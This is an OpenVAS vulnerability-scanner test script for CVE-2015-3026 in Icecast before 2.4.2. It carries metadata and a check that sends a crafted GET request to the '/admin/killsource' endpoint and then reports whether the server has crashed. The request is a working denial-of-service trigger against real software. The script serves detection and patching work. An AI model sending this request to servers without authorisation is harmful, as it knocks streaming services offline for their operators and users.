###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_icecast_stream_auth_handler_dos_vuln.nasl 12219 2018-11-06 02:43:55Z ckuersteiner $
#
# Icecast 'stream_auth' handler Denial of Service Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:icecast:icecast';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805177");
  script_version("$Revision: 12219 $");
  script_cve_id("CVE-2015-3026");
  script_bugtraq_id(73965);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-11-06 03:43:55 +0100 (Tue, 06 Nov 2018) $");
  script_tag(name:"creation_date", value:"2015-05-07 12:58:34 +0530 (Thu, 07 May 2015)");

  script_tag(name:"qod_type", value:"remote_vul");

  script_name("Icecast 'stream_auth' handler Denial of Service Vulnerability");

  script_tag(name:"summary", value:"The host is running Icecast and is prone to remote denial of service
vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and check whether it is able to crash or
not.");

  script_tag(name:"insight", value:"A NULL pointer dereference flaw is triggered if 'stream_auth' handler is
defined for URL authentication.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the application to
crash, creating a denial-of-service condition.");

  script_tag(name:"affected", value:"Icecast version before 2.4.2");

  script_tag(name:"solution", value:"Update to version 2.4.2 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://trac.xiph.org/ticket/2191");
  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2015/04/08/11");
  script_xref(name:"URL", value:"http://lists.xiph.org/pipermail/icecast-dev/2015-April/002460.html");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 8000);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

sndReq = http_get(item: dir +"/admin/killsource?mount=/test.ogg",  port:port);
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

sndReq = http_get(item: dir + "/",  port:port);
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

if (">Icecast Streaming Media Server" >!< rcvRes) {
  report = "It was possible to crash the Icecast server.";
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
